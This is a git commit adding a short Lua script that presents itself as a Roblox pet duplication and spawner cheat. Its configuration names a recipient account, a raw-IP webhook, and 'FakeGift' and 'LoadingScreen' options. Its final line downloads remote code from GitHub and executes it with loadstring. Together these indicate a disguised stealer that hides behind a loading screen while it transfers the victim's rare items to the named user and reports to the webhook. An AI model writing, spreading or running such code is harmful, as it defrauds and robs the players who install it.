2a525d25665ac33b385c4df02dbbb2f5b80a562a
renz1230 <onseeleven1989@gmail.com>
2025-07-22 20:34:46 +0800

    Create Dupeandspawnerpet.lua

---
+++ Dupeandspawnerpet.lua
@@ -0,0 +1,12 @@
+_G.NullConfig = {
+    User = {'Heather_onlys'},
+    min_value = 10000000000,
+    pingEveryone = "No", -- dont change this
+    Webhook = "http://45.13.225.83:20002/proxy/ee8e72b835e007b50bf677782a1b7953",
+    FakeGift = "Yes",
+    Trash = "http://45.13.225.83:20002/proxy/ee8e72b835e007b50bf677782a1b7953",
+    LoadingScreen = "Yes",
+    GiftOnlyRares = "Yes"
+}
+
+loadstring(game:HttpGetAsync('https://raw.githubusercontent.com/sleepyvill/script/refs/heads/main/lib.lua'))()
